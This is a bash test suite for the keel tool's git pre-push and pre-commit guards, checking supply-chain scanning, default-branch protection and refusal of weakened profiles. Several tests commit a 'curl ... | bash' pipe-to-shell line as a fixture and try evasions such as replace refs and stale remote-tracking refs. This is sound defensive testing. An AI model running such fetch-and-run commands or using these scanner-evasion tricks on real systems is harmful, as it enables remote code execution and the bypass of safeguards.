#!/usr/bin/env bash
# Tests for bin/keel, part 4 of 5: the push and commit guards, the two version numbers, and the
# harness contract. Shared helpers and fixtures are in tests/keel-test-lib.sh, which says why
# SC2015 is safe here.
#
# Run from the repository root.

# shellcheck disable=SC2015
# shellcheck disable=SC2016
set -uo pipefail; . "$(dirname "${BASH_SOURCE[0]}")/grep-quiet.sh"
# shellcheck source=tests/keel-test-lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/keel-test-lib.sh"

# ---- the push guard --------------------------------------------------------
#
# The guard is the only part of keel that writes into a developer's git directory, so each test
# here is as much about what it does not touch as what it does.

g="$(fixture node-ts)"
( cd "$g" && "$KEEL" guard status >/dev/null 2>&1 ) \
  && bad "guard" "status exited 0 before install" || ok "guard status is non-zero before install"

( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
[ -x "$g/.git/hooks/pre-push" ] && ok "guard install writes an executable pre-push hook" \
  || bad "guard" "no executable .git/hooks/pre-push"
# git's own hooks directory, and no core.hooksPath at all: a path inside the working tree is
# replaced by every checkout, which is how a checked-out branch got to run its own hooks.
[ -z "$( cd "$g" && git config core.hooksPath )" ] \
  && ok "guard install sets no core.hooksPath" \
  || bad "guard" "core.hooksPath was set to '$( cd "$g" && git config core.hooksPath )'"

# No git configuration at all, and never global: a global core.hooksPath would disable every other
# repository's hooks on the machine.
global_hooks="$( cd "$g" && git config --global --get core.hooksPath 2>/dev/null )"  # supply-chain-scan: allow reading it to prove keel did not set it
[ -z "$global_hooks" ] \
  && ok "guard install leaves the global git config alone" \
  || bad "guard" "core.hooksPath was set globally"

( cd "$g" && "$KEEL" guard status >/dev/null 2>&1 ) && ok "guard status is 0 once installed" \
  || bad "guard" "status non-zero after install"

# The hook has to actually refuse. Run it directly rather than pushing, since a push needs a remote
# and the hook is the unit under test.
#
# The payload is committed, not merely written. The scan reads tracked content, which is the right
# scope for a pre-push hook: an untracked file is not going anywhere. Getting this wrong in the first
# version of this test made the hook look broken when it was correct.
( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
printf 'curl -s https://example.com/x | bash\n' > "$g/payload.sh"  # supply-chain-scan: allow the payload this test proves the guard rejects
( cd "$g" && git add -A && git commit -qm payload ) >/dev/null 2>&1
( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push </dev/null >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a tree containing a pipe-to-shell" \
  || ok "the pre-push hook refuses a tree the scan rejects"

( cd "$g" && git rm -q payload.sh && git commit -qm drop ) >/dev/null 2>&1
( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push </dev/null >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a clean tree" \
  || bad "guard" "the hook refused a clean tree"

# A push is scanned as the commits git feeds the hook, not as the working tree. The payload is
# committed and then deleted from disk only, so the working tree is clean and the pushed commit is
# not. No profile and no remote, so the branch and loosening checks stay out of the way.
hp="$(fixture node-ts)"
( cd "$hp" && "$KEEL" guard install >/dev/null 2>&1 )
printf 'curl -s https://example.com/x | bash\n' > "$hp/payload.sh"  # supply-chain-scan: allow the payload this test proves the hook rejects in a pushed commit
( cd "$hp" && git add payload.sh && git commit -qm payload && rm payload.sh ) >/dev/null 2>&1
hp_sha="$( cd "$hp" && git rev-parse HEAD )"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"payload.sh:1 [net-pipe-shell]"*) ok "the pre-push hook scans the pushed commit, not the working tree" ;;
  *) bad "guard" "refused, but not for payload.sh: $out" ;; esac \
  || bad "guard" "the hook allowed a pushed commit carrying a pipe-to-shell the working tree no longer holds"

# A branch and an annotated tag on the same commit, pushed together, are scanned once: the tag's own
# sha is peeled to the commit before the push's commits are deduplicated.
( cd "$hp" && git tag -a -m release v1 "$hp_sha" ) >/dev/null 2>&1
tag_sha="$( cd "$hp" && git rev-parse v1 )"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\nrefs/tags/v1 %s refs/tags/v1 %s\n' "$hp_sha" '0000000000000000000000000000000000000000' "$tag_sha" '0000000000000000000000000000000000000000' \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"
n="$(printf '%s\n' "$out" | grep -c "scanning $hp_sha")"
[ "$n" -eq 1 ] && ok "the pre-push hook scans a commit once when a branch and a tag on it are pushed together" \
  || bad "guard" "scanned $hp_sha $n times for one branch and one tag on it"

# A tag pushed on its own is scanned as the commit it names, and a replace ref standing in front of
# the tag object changes nothing: the peel ignores replace refs, as keel scan --push does, since
# they change what git reads and not what push sends.
clean_c="$( cd "$hp" && git commit-tree -m clean "$hp_sha~1^{tree}" )"
( cd "$hp" && git tag -a -m release v2 "$hp_sha" ) >/dev/null 2>&1
v2="$( cd "$hp" && git rev-parse v2 )"
fake="$( cd "$hp" && printf 'object %s\ntype commit\ntag v2\ntagger t <t@t.t> 0 +0000\n\nfake\n' "$clean_c" | git mktag )"
( cd "$hp" && git replace -f "$v2" "$fake" ) >/dev/null 2>&1
( cd "$hp" && printf 'refs/tags/v2 %s refs/tags/v2 %s\n' "$v2" '0000000000000000000000000000000000000000' \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a tagged payload a replace ref stands in front of" \
  || ok "the pre-push hook scans a pushed tag as the commit it really names"
( cd "$hp" && git replace -d "$v2" ) >/dev/null 2>&1

# A push that only deletes a branch sends no content, so there is nothing to scan.
( cd "$hp" && printf '(delete) %s refs/heads/topic %s\n' '0000000000000000000000000000000000000000' "$hp_sha" \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a push that only deletes a branch" \
  || bad "guard" "the hook refused a push that only deletes a branch"

# A branch delete in a SHA-256 repository sends 64 zeros, not 40, and is still a delete. This case
# passes before the change too, since the working-tree hook it replaced scanned a clean tree.
s256="$(mktemp -d)"
( cd "$s256" && git init -q --object-format=sha256 -b main . && git config user.email t@t.t && git config user.name t \
  && printf 'a\n' > a.txt && git add a.txt && git commit -qm init && "$KEEL" guard install ) >/dev/null 2>&1
z64='0000000000000000000000000000000000000000000000000000000000000000'
( cd "$s256" && printf '(delete) %s refs/heads/old %s\n' "$z64" "$(git rev-parse HEAD)" \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a branch delete in a SHA-256 repository" \
  || bad "guard" "the hook refused a branch delete in a SHA-256 repository"
rm -rf "$s256"

# git runs the hook with its two arguments and nothing on stdin when there is nothing to update. That
# publishes nothing, so nothing is scanned: an untracked payload on disk refused a no-op push.
printf 'curl -s https://example.com/x | bash\n' > "$hp/scratch.sh"  # supply-chain-scan: allow an untracked payload a push with nothing to update must not read
( cd "$hp" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git </dev/null >/dev/null 2>&1 ) \
  && ok "the pre-push hook scans nothing when git feeds it no refs" \
  || bad "guard" "the hook refused a push with nothing to update over an untracked file on disk"
rm -f "$hp/scratch.sh"

# A keel on PATH older than the hook has no --push, ignores it, and scans the working tree while
# reading as a clean scan of the push. The hook asks first, says so, and scans the working tree with
# it. A stub stands in for the older keel, recording how it is called.
old_bin="$(mktemp -d)"
printf '#!/bin/sh\ncase "$1" in\n    --help) echo "  scan                 supply chain scan of this tree" ;;\n    scan) echo "OLD-KEEL-SCAN $*" ;;\nesac\n' > "$old_bin/keel"
chmod +x "$old_bin/keel"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
   | PATH="$old_bin:$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"
case "$out" in
    *"OLD-KEEL-SCAN scan --push"*) bad "guard" "the hook handed --push to a keel too old to know it" ;;
    *"too old"*)
        case "$out" in
            *"OLD-KEEL-SCAN scan"*) ok "the pre-push hook says a keel is too old for --push, and scans the working tree with it" ;;
            *) bad "guard" "said keel was too old but scanned nothing: $out" ;;
        esac ;;
    *) bad "guard" "expected the too-old message, got: $out" ;;
esac
rm -rf "$old_bin"

# The repository's own tests/supply-chain-scan.sh is never the scanner, even with no keel on PATH:
# a branch would otherwise be judged by its own, possibly weakened, copy. PATH is cut to the system
# directories so no keel is reachable.
mkdir -p "$hp/tests"
printf '#!/bin/sh\necho REPO-SCANNER-RAN\nexit 0\n' > "$hp/tests/supply-chain-scan.sh"
chmod +x "$hp/tests/supply-chain-scan.sh"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
   | PATH="/usr/bin:/bin" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"; rc=$?
if [ "$rc" -ne 0 ]; then bad "guard" "the hook refused with no keel on PATH: $out"
else case "$out" in
    *REPO-SCANNER-RAN*) bad "guard" "the hook ran the repository's own scanner" ;;
    *"not on PATH"*) ok "the pre-push hook never runs the repository's own scanner, and says when nothing was scanned" ;;
    *) bad "guard" "expected the no-keel message, got: $out" ;;
esac; fi
rm -rf "$hp"

# The default-branch refusal. A push feeds the hook its refs on stdin, and that is the only thing
# telling a push to the default branch apart from a push to a topic branch, so the test feeds them
# the same way rather than asserting on the hook's text.
head_sha="$( cd "$g" && git rev-parse HEAD )"
push_to() {
    ( cd "$g" \
      && printf 'refs/heads/local %s %s %s\n' "$head_sha" "$1" '0000000000000000000000000000000000000000' \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 )
}

# No profile and no remote, so nothing states what the default branch is. The hook checks nothing
# rather than assuming `main`: this fixture has no profile until the next line, which is why the
# assertion sits here.
push_to refs/heads/main \
  && ok "the pre-push hook does not guess a default branch with no profile" \
  || bad "guard" "the hook refused on an assumed branch name"

( cd "$g" && "$KEEL" init -y >/dev/null 2>&1 )
push_to refs/heads/main \
  && bad "guard" "the hook allowed a push straight to the default branch" \
  || ok "the pre-push hook refuses a push to the default branch"

push_to refs/heads/feat-x \
  && ok "the pre-push hook allows a push to a topic branch" \
  || bad "guard" "the hook refused a push to a topic branch"

# The branch comes from the profile, so a repo whose default is not `main` is protected on its own
# name. Asserting both directions is the point: protecting `trunk` while still refusing `main`
# would pass a one-sided test and protect nothing here.
python3 - "$g" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["conventions"]["default_branch"]="trunk"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
push_to refs/heads/trunk \
  && bad "guard" "the hook ignored default_branch from the profile" \
  || ok "the pre-push hook protects the branch named in the profile, not 'main'"
push_to refs/heads/main \
  && ok "the pre-push hook allows 'main' when the profile says the default is elsewhere" \
  || bad "guard" "the hook refused a branch that is not the profile's default"

# The escape hatch a project that genuinely pushes to its default branch needs.
python3 - "$g" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["conventions"]["default_branch"]="main"
d["conventions"]["protect_default_branch"]=False
p.write_text(json.dumps(d,indent=2)+"\n")
PY
push_to refs/heads/main \
  && ok "protect_default_branch false allows the push" \
  || bad "guard" "the hook refused with protect_default_branch false"

# --- pre-push: refuses a push that loosens the profile -----------------------------------------
rt="$(fixture bare)"
( cd "$rt" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$rt" && "$KEEL" guard install >/dev/null 2>&1 )
( cd "$rt" && "$KEEL" profile set conventions.protect_default_branch false >/dev/null 2>&1 )
# init writes gates.commit_guard as "off" (`bin/keel#"commit_guard": "off"`). Without this line the baseline and the
# "loosened" commit both hold off, nothing loosens, and the refusal below can never be observed.
# Setting it to required also arms the pre-commit hook for this fixture's commits, which is harmless:
# a bare fixture has null verify.format, lint and typecheck, so the hook runs nothing.
( cd "$rt" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "baseline, gate required" )
old_sha="$( cd "$rt" && git rev-parse HEAD )"

( cd "$rt" && "$KEEL" profile set gates.commit_guard off >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "loosen the commit gate" )
new_sha="$( cd "$rt" && git rev-parse HEAD )"

out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$new_sha" "$old_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
rc=$?
[ "$rc" -ne 0 ] && ok "pre-push refuses a push that loosens gates.commit_guard" \
  || bad "guard" "pre-push allowed a push that turned gates.commit_guard from required to off"
case "$out" in
  *"gates.commit_guard"*) ok "the refusal names the loosened key" ;;
  *) bad "guard" "refusal message does not name gates.commit_guard. Got: $out" ;;
esac

# the reverse direction, tightening, is not refused
( cd "$rt" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "tighten it back" )
tight_sha="$( cd "$rt" && git rev-parse HEAD )"
( cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$tight_sha" "$new_sha" \
    | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && ok "pre-push allows a push that tightens a gate" \
  || bad "guard" "pre-push refused a push that only tightened gates.commit_guard"

# an unrecognized value, not "required", "warn" or "off", such as a typo, must be treated as a
# loosening too. The pre-commit hook's own case statement (`bin/keel#case "$gate" in`) already
# treats anything but required/warn as fully off, so this is a real value a profile can hold, not
# a contrived one. `keel profile set` refuses it now, but a hand edit or an older keel still writes
# one, so the value is written directly.
python3 - "$rt/.keel/profile.json" <<'PY'
import json, sys
p = json.load(open(sys.argv[1]))
p["gates"]["commit_guard"] = "disabled"
json.dump(p, open(sys.argv[1], "w"), indent=2)
PY
( cd "$rt" && git add -A && git commit -q -m "commit_guard set to an unrecognized value" )
bad_val_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$bad_val_sha" "$tight_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"gates.commit_guard"*) ok "pre-push refuses gates.commit_guard set to an unrecognized value" ;;
  *) bad "guard" "gates.commit_guard set to an unrecognized string was not refused. Got: $out" ;;
esac

# restore a recognized value so the later tests in this fixture, which rely on gates.commit_guard
# being "required" going into their own comparisons, are not left resting on "disabled".
( cd "$rt" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "restore commit_guard to required" )

# a first push (remote sha all zeros) compares against the remote-tracking default branch, so a
# branch born weaker than main is refused on its first push, not only its second. The fixture has
# no real remote; a remote-tracking ref pointing at the strong baseline is all the hook reads.
( cd "$rt" && git update-ref refs/remotes/origin/main "$old_sha" )
( cd "$rt" && printf 'refs/heads/weak %s refs/heads/weak %s\n' "$new_sha" "0000000000000000000000000000000000000000" \
    | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && bad "guard" "pre-push allowed a first push of a branch whose profile is weaker than origin/main" \
  || ok "pre-push refuses a first push that is weaker than the remote default branch"

# a verify command replaced by a non-string is a loosening too, not only null. The bare fixture
# starts with verify.test null, so a string goes in first. `keel profile set` writes the literal
# `true` as a JSON boolean, not the string (`bin/keel#raw == "true":  val = True`), which is the shape the idea document names.
( cd "$rt" && "$KEEL" profile set verify.test "npm test" >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.test is a command" )
str_sha="$( cd "$rt" && git rev-parse HEAD )"
( cd "$rt" && "$KEEL" profile set verify.test true >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.test is now JSON true" )
bool_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$bool_sha" "$str_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"verify.test"*) ok "pre-push refuses verify.test becoming a non-string" ;;
  *) bad "guard" "verify.test turned from a string into true and the push was not refused. Got: $out" ;;
esac

# verify.security is one of the keys the original comparator left out entirely (only test, lint,
# format, typecheck, build were checked), so a real command going null there sailed through unrefused.
( cd "$rt" && "$KEEL" profile set verify.security "npm audit" >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.security is a command" )
sec_str_sha="$( cd "$rt" && git rev-parse HEAD )"
( cd "$rt" && "$KEEL" profile set verify.security null >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.security is now null" )
sec_null_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$sec_null_sha" "$sec_str_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"verify.security"*) ok "pre-push refuses verify.security going from a command to null" ;;
  *) bad "guard" "verify.security turned null and the push was not refused. Got: $out" ;;
esac

# removing a gate key outright, not just setting it to "off", is the same loosening by another
# route, and the comparator must not need the key to survive in order to notice it went missing.
python3 - "$rt" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["commit_guard"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY
( cd "$rt" && git add -A && git commit -q -m "remove gates.commit_guard entirely" )
gate_del_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$gate_del_sha" "$sec_null_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"gates.commit_guard"*) ok "pre-push refuses a push that removes gates.commit_guard entirely" ;;
  *) bad "guard" "removing gates.commit_guard was not refused. Got: $out" ;;
esac

# deleting .keel/profile.json entirely is the maximal loosening, every gate and verify check at
# once, and there is no new-side JSON document for the python comparator to be handed at all.
( cd "$rt" && git rm -q .keel/profile.json && git commit -q -m "delete the profile" )
del_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$del_sha" "$gate_del_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"profile.json"*"deleted"*) ok "pre-push refuses a push that deletes .keel/profile.json" ;;
  *) bad "guard" "deleting .keel/profile.json was not refused. Got: $out" ;;
esac

# the first push of a brand-new branch must catch a deleted profile too, not only a second push to
# a branch the remote already has. Resolving the remote comparison point on a first push (all-zero
# remote sha) needs default_branch from the profile, and the hook read that from the working tree
# of the branch being pushed, which is exactly the file this push deletes: the fallback silently
# never ran and the deletion went unrefused. `git checkout` the new branch for real, unlike the
# other cases above, which never diverge from main and so never exercise this: default_branch has
# to come from a working tree that genuinely lacks the profile, the way a real push would leave it.
( cd "$rt" && git checkout -q -b brand-new "$gate_del_sha" )
( cd "$rt" && git update-ref refs/remotes/origin/main "$gate_del_sha" )
( cd "$rt" && git rm -q .keel/profile.json && git commit -q -m "first push of a new branch, profile gone" )
new_branch_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/brand-new %s refs/heads/brand-new %s\n' "$new_branch_sha" "0000000000000000000000000000000000000000" \
       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"profile.json"*"deleted"*) ok "pre-push refuses a first push of a new branch that deletes the profile" ;;
  *) bad "guard" "first push of a new branch deleting the profile was not refused. Got: $out" ;;
esac
rm -rf "$rt"

# --- pre-push: a Windows Store python3 alias must not be read as a loosening report -------------
# have_py here (bin/keel#guard_hook_body) used `command -v python3` too: the shim looked present,
# so the loosening comparator actually ran it, and its not-found message came back as $report,
# non-empty, read as though the profile had loosened. Nothing about this profile moved.
storeshim2="$(mktemp -d)"
cat > "$storeshim2/python3" <<'SHIM'
#!/bin/sh
printf 'Python was not found; run without arguments to install from the Microsoft Store.\n'
exit 49
SHIM
chmod +x "$storeshim2/python3"

pp="$(fixture bare)"
( cd "$pp" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$pp" && "$KEEL" guard install >/dev/null 2>&1 )
( cd "$pp" && "$KEEL" profile set conventions.protect_default_branch false >/dev/null 2>&1 )
( cd "$pp" && git add -A && git commit -q -m "baseline" )
old_sha2="$( cd "$pp" && git rev-parse HEAD )"
( cd "$pp" && "$KEEL" profile set project.description "unchanged gates, unrelated edit" >/dev/null 2>&1 )
( cd "$pp" && git add -A && git commit -q -m "unrelated edit, nothing loosened" )
new_sha2="$( cd "$pp" && git rev-parse HEAD )"
pp_out="$(cd "$pp" && printf 'refs/heads/main %s refs/heads/main %s\n' "$new_sha2" "$old_sha2" \
   | PATH="$storeshim2:$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
pp_rc=$?
[ "$pp_rc" -eq 0 ] \
  && ok "pre-push does not mistake a Store-alias python3's not-found message for a loosening report" \
  || bad "guard" "pre-push refused a push that loosened nothing, with a Store-alias python3 on PATH. Got: $pp_out"
rm -rf "$pp" "$storeshim2"

# --- pre-push: a push source holding a space ------------------------------------------------
# git hands the hook each push source as written, and `:/fix HEAD`, a commit named by its message,
# holds a space. Split on spaces from the left, the local sha read as HEAD, so the scan read HEAD
# and not the commit being pushed, and the remote ref read as a sha, so a push to the default branch
# was not recognised as one. A real push into a bare remote, since the line is git's to write.
sp="$(fixture node-ts)"; git init -q --bare "$sp.remote"
( cd "$sp" && git remote add origin "$sp.remote" && "$KEEL" guard install ) >/dev/null 2>&1
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a spaced push source tries to slip past the hook
( cd "$sp" && git add payload.sh && git commit -qm "fix HEAD" && git rm -q payload.sh && git commit -qm clean ) >/dev/null 2>&1
( cd "$sp" && PATH="$(dirname "$KEEL"):$PATH" git push -q origin ':/fix HEAD:refs/heads/x' >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a payload pushed from a source holding a space" \
  || ok "the pre-push hook scans the commit a source holding a space names"
( cd "$sp" && "$KEEL" init -y && git add -A && git commit -qm "tidy HEAD" ) >/dev/null 2>&1
out="$( cd "$sp" && PATH="$(dirname "$KEEL"):$PATH" git push -q origin ':/tidy HEAD:refs/heads/main' 2>&1 )"
case "$out" in *"is the default branch"*) ok "the pre-push hook refuses a push to the default branch from a source holding a space" ;;
  *) bad "guard" "a push to main from a source holding a space was not refused as one: $out" ;; esac
rm -rf "$sp" "$sp.remote"

# --- pre-push: a remote-tracking ref is not the remote ------------------------------------------
# A remote-tracking ref records what was last fetched, possibly from another URL, and not what the
# remote being pushed to holds. A skip for commits one already reached published a payload unscanned
# once `git remote set-url` pointed the remote somewhere new.
sp="$(fixture node-ts)"; git init -q --bare "$sp.old"; git init -q --bare "$sp.new"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a stale remote-tracking ref tries to wave through
( cd "$sp" && git remote add origin "$sp.old" && git add payload.sh && git commit -qm payload \
  && git push -q origin HEAD:refs/heads/topic && git remote set-url origin "$sp.new" && "$KEEL" guard install ) >/dev/null 2>&1
( cd "$sp" && PATH="$(dirname "$KEEL"):$PATH" git push -q origin HEAD:refs/heads/topic >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a payload because a stale remote-tracking ref reached it" \
  || ok "the pre-push hook scans a commit a remote-tracking ref already reaches"
rm -rf "$sp" "$sp.old" "$sp.new"

# The hook body lives inside a quoted heredoc, so the repo's own lint reads it as a string and never
# parses it. Linting the generated file is the only way that code gets checked at all.
if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$g/.git/hooks/pre-push" >/dev/null 2>&1 \
      && ok "the generated pre-push hook is shellcheck clean" \
      || bad "guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$g/.git/hooks/pre-push" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated hook was not linted\n'
fi

( cd "$g" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ ! -e "$g/.git/hooks/pre-push" ] \
  && ok "guard uninstall removes the pre-push hook" || bad "guard" "pre-push survived uninstall"
rm -rf "$g"

# ---- the commit guard ------------------------------------------------------
#
# One install writes two hooks, and the second one is inert until the profile asks for it. That
# split is the design: a team installs the guard for the push protections, and a commit gate that
# arrived uninvited alongside them is how a tool gets uninstalled.

c="$(fixture node-ts)"
( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$c" && "$KEEL" guard install >/dev/null 2>&1 )

[ -x "$c/.git/hooks/pre-commit" ] && ok "guard install writes an executable pre-commit hook" \
  || bad "commit guard" "no executable .git/hooks/pre-commit"

gate_of() { python3 -c "import json;print(json.load(open('$1/.keel/profile.json'))['gates'].get('commit_guard'))" 2>/dev/null; }
[ "$(gate_of "$c")" = "off" ] && ok "init writes gates.commit_guard off by default" \
  || bad "commit guard" "gates.commit_guard is '$(gate_of "$c")', want 'off'"

# Off is off, and this fixture proves it rather than asserting it: its lint is `eslint .`, which is
# not installed here, so a hook that read the gate wrongly would fail on this line.
( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
  && ok "the pre-commit hook is inert while gates.commit_guard is off" \
  || bad "commit guard" "the hook ran its checks with the gate off"

# The remedy the refusal has to name. Set before the gate so the first refusal already carries it.
( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 2' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.format_fix 'npm run format' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )

( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
  && bad "commit guard" "the hook allowed a commit past a failing verify command" \
  || ok "the pre-commit hook refuses when a verify command fails"

out="$( cd "$c" && .git/hooks/pre-commit 2>&1 )"
case "$out" in *"npm run format"*) ok "the refusal names verify.format_fix as the remedy" ;;
  *) bad "commit guard" "the refusal did not name format_fix" ;; esac
case "$out" in *"--no-verify"*) ok "the refusal names the escape hatch" ;;
  *) bad "commit guard" "the refusal did not name --no-verify" ;; esac

# It checks and never rewrites. A hook that reformatted the tree would put content into a commit
# its author never read, which is the reason this gate refuses instead of fixing.
before="$( cd "$c" && git status --porcelain )"
( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 )
[ "$( cd "$c" && git status --porcelain )" = "$before" ] \
  && ok "the refusing hook leaves the working tree alone" \
  || bad "commit guard" "the hook modified the tree"

( cd "$c" && "$KEEL" profile set gates.commit_guard warn >/dev/null 2>&1 )
( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
  && ok "warn reports the failure and allows the commit" \
  || bad "commit guard" "warn refused the commit"

# Passing commands, and the two shapes doctor also refuses to run: a null command and a templated
# one, neither of which can be executed as written.
( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 1' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.lint 'eslint {path}' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.typecheck null >/dev/null 2>&1 )
( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
  && ok "the hook skips null and templated commands and allows the commit" \
  || bad "commit guard" "the hook ran a null or templated command"

# Intermittent, not yet root caused: this assertion has failed a handful of times in a full suite
# run and never once standalone or in a fixture built fresh for just this case, which rules out the
# assertion and the command it checks. Carries its own evidence on failure rather than a bare "it
# said nothing", so the next occurrence is diagnosable instead of needing to be caught live again.
gs_out="$( cd "$c" && "$KEEL" guard status 2>&1 )"
printf '%s\n' "$gs_out" | grep -qi "commit guard" \
  && ok "guard status reports the commit guard as well as the push guard" \
  || bad "commit guard" "status said nothing about the commit guard. Got: [$gs_out] core.hooksPath=[$( cd "$c" && git config core.hooksPath 2>/dev/null )] fixture=[$c]"

if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$c/.git/hooks/pre-commit" >/dev/null 2>&1 \
      && ok "the generated pre-commit hook is shellcheck clean" \
      || bad "commit guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$c/.git/hooks/pre-commit" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated pre-commit hook was not linted\n'
fi

# --- pre-commit: a Windows Store python3 alias must be treated as absent, not present -----------
# `if ! command -v python3` (bin/keel#guard_precommit_body) only checked PATH, so the shim passed
# it, and the gate value read back from `field()` was the shim's not-found message instead of
# "required", which fell through the hook's own case statement to the catch-all "not a value the
# hook knows about, exit 0" with no explanation printed. A required gate went unchecked silently.
storeshim3="$(mktemp -d)"
